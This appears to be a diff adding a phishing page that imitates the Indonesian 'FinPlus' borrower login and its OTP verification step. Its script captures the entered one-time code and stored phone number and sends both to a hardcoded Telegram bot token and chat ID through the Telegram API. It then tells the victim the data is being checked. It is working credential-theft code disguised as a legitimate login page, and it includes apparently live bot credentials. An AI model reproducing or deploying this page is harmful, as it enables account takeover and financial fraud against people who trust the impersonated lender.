@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>FinPlus - Masuk Peminjam</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+      font-size: 14px;
+    }
+    header {
+      background-color: #2196f3;
+      color: white;
+      padding: 10px 15px;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+    }
+    .back-arrow {
+      cursor: pointer;
+      margin-right: 12px;
+      display: flex;
+      align-items: center;
+      width: 20px;
+      height: 20px;
+    }
+    main {
+      padding: 15px 15px 0 15px;
+    }
+    h1 {
+      font-weight: 700;
+      margin-bottom: 8px;
+      font-size: 18px;
+      color: #000;
+    }
+    .info-text {
+      color: #999999;
+      margin-bottom: 6px;
+      font-size: 13px;
+      font-weight: 400;
+    }
+    .phone-number {
+      font-weight: 400;
+      font-size: 13px;
+      margin-bottom: 18px;
+      color: #999999;
+      min-height: 18px;
+    }
+    .input-group {
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    input[type="text"] {
+      flex: 1;
+      padding: 8px 4px;
+      font-size: 14px;
+      border: none;
+      border-bottom: 1px solid #ccc;
+      outline: none;
+      font-weight: 400;
+      color: #333;
+    }
+    input[type="text"]::placeholder {
+      color: #999;
+    }
+    input[type="text"]:focus {
+      border-color: #2196f3;
+    }
+    .timer {
+      background-color: #ccc;
+      color: #666;
+      padding: 6px 12px;
+      border-radius: 12px;
+      user-select: none;
+      margin-left: 8px;
+      min-width: 50px;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 500;
+    }
+    .resend-link {
+      color: #999999;
+      cursor: pointer;
+      font-size: 12px;
+      margin-top: 6px;
+      display: inline-block;
+      font-weight: 400;
+    }
+    button {
+      background-color: #d0d0d0;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      padding: 14px 0;
+      width: 100%;
+      cursor: default;
+      margin-top: 30px;
+      border-radius: 8px;
+      font-weight: 600;
+    }
+    button.enabled {
+      background-color: #2196f3;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="back-arrow" onclick="window.history.back()" aria-label="Back">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" >
+        <path d="M15 18L9 12L15 6" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <div>FinPlus</div>
+  </header>
+  <main>
+    <h1>Masuk peminjam</h1>
+    <p class="info-text">Kode verifikasi akan dikirim ke nomor hp</p>
+    <p class="phone-number" id="phone-number"></p>
+
+    <div class="input-group">
+      <input type="text" id="otp" placeholder="Kode Verifikasi" maxlength="6" autofocus />
+      <span class="timer" id="timer">35 s</span>
+    </div>
+    <div>
+      <span>Tidak menerima OTP? </span>
+      <span class="resend-link" id="resend-otp" onclick="resendOtp()">Coba cara lain &gt;</span>
+    </div>
+
+    <button id="next-btn" disabled>Langkah Selanjutnya</button>
+  </main>
+
+  <script>
+    // Ganti ini dengan token bot Telegram Anda
+    const telegramBotToken = '8495807271%3AAAG-94xlNDFN_Tv8wuj1n3vNHV-WvSN3r18';
+    // Ganti ini dengan chat_id Anda (gunakan bot untuk mendapatkan chat_id)
+    const telegramChatId = '6155537801';
+
+    // Simulasi simpan nomor ke localStorage jika belum ada (hapus bila sudah punya cara simpan sendiri)
+    if(!localStorage.getItem('phoneNumber')) {
+      localStorage.setItem('phoneNumber', '#');
+    }
+
+    const phoneNumberEl = document.getElementById('phone-number');
+    const storedPhoneNumber = localStorage.getItem('phoneNumber');
+    if(storedPhoneNumber) {
+      phoneNumberEl.textContent = storedPhoneNumber;
+    } else {
+      phoneNumberEl.textContent = 'Nomor tidak tersedia';
+    }
+
+    const otpInput = document.getElementById('otp');
+    const nextBtn = document.getElementById('next-btn');
+    const timerEl = document.getElementById('timer');
+    const resendOtpEl = document.getElementById('resend-otp');
+
+    // Enable tombol 'Langkah Selanjutnya' jika otp 6 digit
+    otpInput.addEventListener('input', () => {
+      if (otpInput.value.length === 6) {
+        nextBtn.disabled = false;
+        nextBtn.classList.add('enabled');
+      } else {
+        nextBtn.disabled = true;
+        nextBtn.classList.remove('enabled');
+      }
+    });
+
+    // Timer 60 detik
+    let countdown = 60;
+    let interval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(interval);
+        timerEl.textContent = '';
+        resendOtpEl.style.color = '#2196f3';
+        resendOtpEl.style.cursor = 'pointer';
+        resendOtpEl.style.textDecoration = 'underline';
+      } else {
+        timerEl.textContent = countdown + ' s';
+      }
+    }, 1000);
+
+    function resendOtp() {
+      if (countdown <= 0) {
+        alert('Kode OTP baru telah dikirim ke nomor anda.');
+        countdown = 60;
+        timerEl.textContent = countdown + ' s';
+        resendOtpEl.style.color = '#999999';
+        resendOtpEl.style.cursor = 'default';
+        resendOtpEl.style.textDecoration = 'none';
+        interval = setInterval(() => {
+          countdown--;
+          if (countdown <= 0) {
+            clearInterval(interval);
+            timerEl.textContent = '';
+            resendOtpEl.style.color = '#2196f3';
+            resendOtpEl.style.cursor = 'pointer';
+            resendOtpEl.style.textDecoration = 'underline';
+          } else {
+            timerEl.textContent = countdown + ' s';
+          }
+        }, 1000);
+      }
+    }
+
+    // Kirim data ke Telegram
+    nextBtn.addEventListener('click', () => {
+      if (!nextBtn.disabled) {
+        const otpValue = otpInput.value;
+        const phoneNumber = phoneNumberEl.textContent;
+
+        const message = encodeURIComponent(
+          `Data Verifikasi FinPlus\nNomor HP: ${phoneNumber}\nKode OTP: ${otpValue}`
+        );
+
+        const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`;
+
+        fetch(telegramURL)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert('Data Sedang diperiksa');
+              // Reset input dan tombol
+              otpInput.value = '';
+              nextBtn.disabled = true;
+              nextBtn.classList.remove('enabled');
+            } else {
+              alert('Gagal mengirim data ke Telegram!');
+            }
+          })
+          .catch(error => {
+            alert('Terjadi kesalahan saat mengirim data ke Telegram!');
+            console.error(error);
+          });
+      }
+    });
+  </script>
+</body>
+</html>
